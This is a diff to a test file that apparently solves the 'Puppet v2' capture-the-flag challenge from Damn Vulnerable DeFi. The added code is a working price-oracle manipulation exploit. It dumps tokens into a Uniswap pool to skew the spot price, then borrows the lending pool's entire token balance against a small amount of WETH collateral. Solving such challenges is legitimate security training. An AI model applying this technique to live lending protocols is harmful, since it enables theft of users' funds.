@@ -82,6 +82,33 @@ describe('[Challenge] Puppet v2', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        // Calculate ETH to deposit to withdraw all DVT: RESULT: 30000 ETH
+        let eth_to_deposit = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log(ethers.utils.formatEther(eth_to_deposit))
+
+        // SWAP all DVT but 1 FOR ETH to increase the ETH price
+        const blockNumBefore = await ethers.provider.getBlockNumber();
+        const blockBefore = await ethers.provider.getBlock(blockNumBefore);
+        const timestampBefore = blockBefore.timestamp;
+        await this.token.connect(attacker).approve(this.uniswapRouter.address, ATTACKER_INITIAL_TOKEN_BALANCE)
+        await this.uniswapRouter.connect(attacker).swapExactTokensForETH(ethers.utils.parseEther('9999'), 1, [this.token.address, await this.uniswapRouter.WETH()], attacker.address, timestampBefore * 2)
+        
+        // Calculate again ETH to deposit to withdraw all DVT: RESULT: 29.6 ETH
+        eth_to_deposit = await this.lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE)
+        console.log(ethers.utils.formatEther(eth_to_deposit))
+        
+        // WRAP 29.6 ETH & approve those weth to lending pool
+        let ether_amount = ethers.utils.parseUnits("29.6")
+        await this.weth.connect(attacker).deposit({ value: ether_amount })
+        let attacker_balance = await ethers.provider.getBalance(attacker.address)
+        console.log(ethers.utils.formatEther(attacker_balance))
+        weth_attacker_balance = await this.weth.balanceOf(attacker.address)
+        await this.weth.connect(attacker).approve(this.lendingPool.address, weth_attacker_balance)
+        console.log(ethers.utils.formatEther(weth_attacker_balance))
+
+        // Borrow all DVT from the lending pool using the 29.6 weth as collateral
+        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE)
     });
 
     after(async function () {
